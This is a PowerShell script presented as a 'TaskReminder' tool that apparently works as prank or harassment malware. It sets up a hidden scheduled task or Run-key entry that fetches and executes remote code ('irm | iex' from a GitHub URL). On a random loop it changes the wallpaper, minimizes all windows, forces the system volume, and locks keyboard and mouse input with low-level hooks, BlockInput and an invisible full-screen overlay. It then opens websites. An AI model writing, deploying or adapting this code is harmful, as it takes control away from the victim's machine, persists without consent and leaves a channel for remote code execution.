# ================= CONFIG =================
$BaseUrl   = "https://raw.githubusercontent.com/Kiyan-7/telaviv/main"
$ScriptUrl = "$BaseUrl/reminders.ps1"

$Sites = @{
    1 = "https://docs.google.com/"
    2 = "https://slides.google.com"
    3 = "https://wordle.com/"
    4 = "https://newyorktimes.com/"
    5 = "https://funnews.com"
}

$MinSeconds            = 10
$MaxSeconds            = 120
$AvoidRepeat           = $true
$MinimizeAll           = $true
$ShowConsole           = $false

$Volume                = 0.05
$SetSystemVolume       = $true
$FreezeVolume          = $true
$MaxAudioWait          = 60

$FreezeInput           = $true
$PostSiteFreezeSeconds = 20    # STRENGTHENED: 20 seconds of locked input after site opens

$TaskName              = "TaskReminder"
$DailyStartTime        = "08:00"
$LogonDelay            = "PT20S"
# ==========================================

# ---- Global Error Trap ----
trap {
    "$(Get-Date) - FATAL ERROR: $_`nLine: $($_.InvocationInfo.ScriptLineNumber)" | Out-File "$env:USERPROFILE\Desktop\TaskReminder_Error.txt" -Append
    exit
}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$Dir     = Join-Path $env:TEMP "TaskReminder"
$LogFile = Join-Path $Dir "log.txt"
New-Item -ItemType Directory -Path $Dir -Force | Out-Null

function Log($m) {
    try { "$(Get-Date -Format 'HH:mm:ss') $m" | Add-Content $LogFile } catch {}
    if ($ShowConsole) { Write-Host $m }
}

function Add-Native($name, $code, $refs) {
    try {
        $p = @{ TypeDefinition = $code; ErrorAction = 'Stop' }
        if ($refs) { $p.ReferencedAssemblies = $refs }
        Add-Type @p
        $true
    } catch {
        Log "$name SETUP FAILED: $($_.Exception.Message)"
        $false
    }
}

# ---- Only one copy at a time ----
$mutex = New-Object System.Threading.Mutex($false, "Local\TaskReminderLoop")
if (-not $mutex.WaitOne(0)) { Log "Already running, exiting."; exit }
$PID | Out-File (Join-Path $Dir "pid.txt") -Force

$CurrentUser = "$env:USERDOMAIN\$env:USERNAME"
Log "--- started as $CurrentUser."

# ---- Autostart ----
$PsExe      = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
$LaunchArgs = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"irm '$ScriptUrl' | iex`""

$taskOk = $false
try {
    if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
        $taskOk = $true
    } else {
        $logon = New-ScheduledTaskTrigger -AtLogOn -User $CurrentUser
        $logon.Delay = $LogonDelay
        Register-ScheduledTask -TaskName $TaskName -Force -ErrorAction Stop `
            -Action    (New-ScheduledTaskAction -Execute $PsExe -Argument $LaunchArgs) `
            -Trigger   @($logon, (New-ScheduledTaskTrigger -Daily -At $DailyStartTime)) `
            -Settings  (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew -ExecutionTimeLimit ([TimeSpan]::Zero)) `
            -Principal (New-ScheduledTaskPrincipal -UserId $CurrentUser -LogonType Interactive -RunLevel Limited) | Out-Null
        $taskOk = [bool](Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)
        Log "AUTOSTART: scheduled task created: $taskOk"
    }
} catch { Log "AUTOSTART TASK FAILED: $($_.Exception.Message)" }

if (-not $taskOk) {
    try {
        $runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty $runKey -Name $TaskName -Value "`"$PsExe`" $LaunchArgs" -ErrorAction Stop
        Log "AUTOSTART: fell back to HKCU Run key"
    } catch { 
        Log "AUTOSTART RUN KEY FAILED: $($_.Exception.Message)" 
        "Failed to set autostart!" | Out-File "$env:USERPROFILE\Desktop\TaskReminder_Error.txt" -Append
    }
}

# ---- Downloads ----
for ($n = 0; -not [Net.NetworkInformation.NetworkInterface]::GetIsNetworkAvailable() -and $n -lt 60; $n++) {
    Start-Sleep -Seconds 1
}

foreach ($f in (1..5 | ForEach-Object { "image$_.jpg"; "audio$_.wav" })) {
    $dest = Join-Path $Dir $f
    for ($a = 1; $a -le 4; $a++) {
        try {
            $tmp = "$dest.tmp"
            Invoke-WebRequest -UseBasicParsing "$BaseUrl/$f" -OutFile $tmp -ErrorAction Stop
            $len = (Get-Item $tmp).Length
            if ($len -lt 1000) { throw "file is only $len bytes" }
            Move-Item $tmp $dest -Force
            Log "Downloaded $f ($len bytes)"
            break
        } catch {
            Log "DOWNLOAD FAILED (attempt $a/4) $f : $($_.Exception.Message)"
            Remove-Item "$dest.tmp" -Force -ErrorAction SilentlyContinue
            if ($a -lt 4) { Start-Sleep -Seconds (2 * $a) }
        }
    }
}

# ---- Wallpaper ----
$wpOk = Add-Native "WALLPAPER" @"
using System.Runtime.InteropServices;
public class WP {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int SystemParametersInfo(int a, int b, string c, int d);
}
"@
if ($wpOk) {
    Set-ItemProperty "HKCU:\Control Panel\Desktop" WallpaperStyle "10"
    Set-ItemProperty "HKCU:\Control Panel\Desktop" TileWallpaper  "0"
}

# ---- Input freeze ----
$freezeOk = $FreezeInput -and (Add-Native "INPUT FREEZE" @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

public class InputFreezer {
    delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("user32.dll", SetLastError=true)] static extern IntPtr SetWindowsHookEx(int id, HookProc fn, IntPtr mod, uint tid);
    [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr h);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr w, IntPtr l);
    [DllImport("user32.dll")] static extern bool BlockInput(bool block);
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)] static extern IntPtr GetModuleHandle(string name);
    [DllImport("kernel32.dll")] static extern uint GetCurrentThreadId();
    [DllImport("user32.dll")] static extern int GetMessage(out MSG m, IntPtr hWnd, uint min, uint max);
    [DllImport("user32.dll")] static extern bool PostThreadMessage(uint tid, uint msg, IntPtr w, IntPtr l);
    [StructLayout(LayoutKind.Sequential)]
    struct MSG { public IntPtr hwnd; public uint message; public IntPtr wParam; public IntPtr lParam; public uint time; public int x; public int y; }

    static HookProc kbProc = KbCallback, msProc = MsCallback;
    static IntPtr hKb = IntPtr.Zero, hMs = IntPtr.Zero;
    static Thread t;
    static uint tid;
    public static bool Ok, BlockInputOk;
    public static int LastError;

    static IntPtr KbCallback(int n, IntPtr w, IntPtr l) { return n >= 0 ? (IntPtr)1 : CallNextHookEx(hKb, n, w, l); }
    static IntPtr MsCallback(int n, IntPtr w, IntPtr l) { return n >= 0 ? (IntPtr)1 : CallNextHookEx(hMs, n, w, l); }

    public static bool Start() {
        if (t != null) return Ok || BlockInputOk;
        var ready = new ManualResetEvent(false);
        Ok = false; BlockInputOk = false;
        t = new Thread(() => {
            tid = GetCurrentThreadId();
            IntPtr mod = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
            hKb = SetWindowsHookEx(13, kbProc, mod, 0);
            if (hKb == IntPtr.Zero) LastError = Marshal.GetLastWin32Error();
            hMs = SetWindowsHookEx(14, msProc, mod, 0);
            if (hMs == IntPtr.Zero) LastError = Marshal.GetLastWin32Error();
            Ok = hKb != IntPtr.Zero && hMs != IntPtr.Zero;
            try { BlockInputOk = BlockInput(true); } catch { }
            ready.Set();
            if (Ok || BlockInputOk) { MSG m; while (GetMessage(out m, IntPtr.Zero, 0, 0) > 0) { } }
            if (BlockInputOk) { try { BlockInput(false); } catch { } }
            if (hKb != IntPtr.Zero) UnhookWindowsHookEx(hKb);
            if (hMs != IntPtr.Zero) UnhookWindowsHookEx(hMs);
            hKb = IntPtr.Zero; hMs = IntPtr.Zero;
        });
        t.IsBackground = true;
        t.Start();
        ready.WaitOne(3000);
        if (!Ok && !BlockInputOk) { Stop(); return false; }
        return true;
    }

    public static void Stop() {
        if (t == null) return;
        PostThreadMessage(tid, 0x0012, IntPtr.Zero, IntPtr.Zero);
        if (!t.Join(2000)) {
            if (hKb != IntPtr.Zero) UnhookWindowsHookEx(hKb);
            if (hMs != IntPtr.Zero) UnhookWindowsHookEx(hMs);
        }
        t = null; Ok = false; BlockInputOk = false;
    }
}
"@)

# ---- Touch shield ----
$shieldOk = $FreezeInput -and (Add-Native "TOUCH SHIELD" @"
using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

public class TouchShield {
    [DllImport("user32.dll")] static extern bool SetProcessDPIAware();
    static Form f;
    static Thread t;

    public static void Start() {
        if (t != null) return;
        try { SetProcessDPIAware(); } catch { }
        var ready = new ManualResetEvent(false);
        t = new Thread(() => {
            f = new Form();
            f.FormBorderStyle = FormBorderStyle.None;
            f.StartPosition = FormStartPosition.Manual;
            f.Bounds = SystemInformation.VirtualScreen;
            f.TopMost = true;
            f.ShowInTaskbar = false;
            f.BackColor = Color.Black;
            f.Opacity = 0.02;
            f.Shown += (s, e) => { ready.Set(); };
            Application.Run(f);
        });
        t.SetApartmentState(ApartmentState.STA);
        t.IsBackground = true;
        t.Start();
        ready.WaitOne(3000);
    }

    public static void Stop() {
        if (t == null) return;
        try { if (f != null && f.IsHandleCreated) f.Invoke((MethodInvoker)delegate { f.Close(); }); } catch { }
        t.Join(2000);
        t = null; f = null;
    }
}
"@ @("System.Windows.Forms", "System.Drawing"))

# ---- System volume ----
$volOk = $SetSystemVolume -and (Add-Native "VOLUME" @"
using System.Runtime.InteropServices;

[Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IAudioEndpointVolume {
    int f(); int g(); int h(); int i();
    int SetMasterVolumeLevelScalar(float fLevel, System.Guid pguidEventContext);
    int j();
    int GetMasterVolumeLevelScalar(out float pfLevel);
    int k(); int l(); int m(); int n();
    int SetMute([MarshalAs(UnmanagedType.Bool)] bool bMute, System.Guid pguidEventContext);
    int GetMute(out bool pbMute);
}

[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDevice {
    int Activate(ref System.Guid id, int clsCtx, int activationParams, out IAudioEndpointVolume aev);
}

[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDeviceEnumerator {
    int f();
    int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);
}

[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")]
class MMDeviceEnumeratorComObject { }

public class SysVol {
    static IAudioEndpointVolume Vol() {
        var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;
        IMMDevice dev = null;
        Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(0, 1, out dev));
        IAudioEndpointVolume epv = null;
        var epvid = typeof(IAudioEndpointVolume).GUID;
        Marshal.ThrowExceptionForHR(dev.Activate(ref epvid, 23, 0, out epv));
        return epv;
    }
    public static float Volume {
        get { float v = -1; Marshal.ThrowExceptionForHR(Vol().GetMasterVolumeLevelScalar(out v)); return v; }
        set { Marshal.ThrowExceptionForHR(Vol().SetMasterVolumeLevelScalar(value, System.Guid.Empty)); }
    }
    public static bool Mute {
        get { bool m; Marshal.ThrowExceptionForHR(Vol().GetMute(out m)); return m; }
        set { Marshal.ThrowExceptionForHR(Vol().SetMute(value, System.Guid.Empty)); }
    }
}
"@)

# ---- Audio ----
$script:player = $null
try {
    Add-Type -AssemblyName PresentationCore -ErrorAction Stop
    $script:player = New-Object System.Windows.Media.MediaPlayer
} catch { Log "AUDIO SETUP FAILED: $($_.Exception.Message)" }

# ---- Helpers ----
$script:frozen   = $false
$script:shielded = $false

function Start-Freeze {
    if ($freezeOk -and -not $script:frozen) {
        try {
            $script:frozen = [InputFreezer]::Start()
            Log "Input freeze: $($script:frozen)"
        } catch { Log "INPUT FREEZE ERROR: $($_.Exception.Message)" }
    }
    if ($shieldOk -and -not $script:shielded) {
        try { [TouchShield]::Start(); $script:shielded = $true; Log "Touch shield on" }
        catch { Log "TOUCH SHIELD ERROR: $($_.Exception.Message)" }
    }
}

function Stop-Freeze {
    if ($script:frozen)   { try { [InputFreezer]::Stop() } catch {}; $script:frozen   = $false; Log "Input released" }
    if ($script:shielded) { try { [TouchShield]::Stop() }  catch {}; $script:shielded = $false; Log "Touch shield off" }
}

function Pin-Volume {
    if (-not ($FreezeVolume -and $volOk)) { return }
    try {
        if ([SysVol]::Mute) { [SysVol]::Mute = $false }
        if ([math]::Abs([SysVol]::Volume - $Volume) -gt 0.01) { [SysVol]::Volume = [single]$Volume }
    } catch {}
}

function Start-Audio($n) {
    if (-not $script:player) { return 0 }
    $file = Join-Path $Dir "audio$n.wav"
    try {
        $script:player.Stop()
        $script:player.Close()
        $script:player = New-Object System.Windows.Media.MediaPlayer
        $script:player.Open([Uri]$file)
        $script:player.Volume = 1.0
        for ($t = 0; -not $script:player.NaturalDuration.HasTimeSpan -and $t -lt 30; $t++) {
            Start-Sleep -Milliseconds 100
        }
        if (-not $script:player.NaturalDuration.HasTimeSpan) { Log "AUDIO FAILED to load $file"; return 0 }
        if ($volOk) {
            try { [SysVol]::Mute = $false; [SysVol]::Volume = [single]$Volume }
            catch { Log "VOLUME SET FAILED: $($_.Exception.Message)" }
        }
        $dur = $script:player.NaturalDuration.TimeSpan.TotalSeconds
        $script:player.Play()
        Log "Playing audio$n.wav ($([int]$dur)s)"
        return [int]([math]::Min($dur + 0.5, $MaxAudioWait) * 1000)
    } catch { Log "AUDIO FAILED: $($_.Exception.Message)"; return 0 }
}

# ---- Main loop ----
$last = 0
while ($true) {
    do { $x = Get-Random -Minimum 1 -Maximum 6 } while ($AvoidRepeat -and $x -eq $last)
    $last = $x
    Log "Task $x"

    # 1. Wallpaper
    if ($wpOk) {
        try {
            $img = Join-Path $Dir "image$x.jpg"
            if (-not [WP]::SystemParametersInfo(20, 0, $img, 3)) { Log "Wallpaper call failed" }
        } catch { Log "WALLPAPER FAILED: $($_.Exception.Message)" }
    }

    # 2. Aggressive Minimize
    if ($MinimizeAll) {
        try { (New-Object -ComObject Shell.Application).MinimizeAll() }
        catch { Log "MINIMISE FAILED: $($_.Exception.Message)" }
    }

    # 3. Audio & Freeze Lockout
    $waitMs = Start-Audio $x
    try {
        Start-Freeze
        $end = (Get-Date).AddMilliseconds($waitMs)
        
        # Pin volume and hold input hostage during audio
        while ((Get-Date) -lt $end) { 
            Pin-Volume
            Start-Sleep -Milliseconds 100 
        }

        # Open Website
        try { Start-Process $Sites[$x] -ErrorAction Stop }
        catch { Log "OPEN SITE FAILED: $($_.Exception.Message)" }

        # Strengthened Lockout: Keep input frozen for 20 seconds AFTER the site opens
        if ($script:frozen -or $script:shielded) { 
            $lockoutEnd = (Get-Date).AddSeconds($PostSiteFreezeSeconds)
            while ((Get-Date) -lt $lockoutEnd) {
                Pin-Volume
                Start-Sleep -Milliseconds 100
            }
        }
    } finally { Stop-Freeze }

    # Random gap before next reminder
    Start-Sleep -Seconds (Get-Random -Minimum $MinSeconds -Maximum ($MaxSeconds + 1))
}
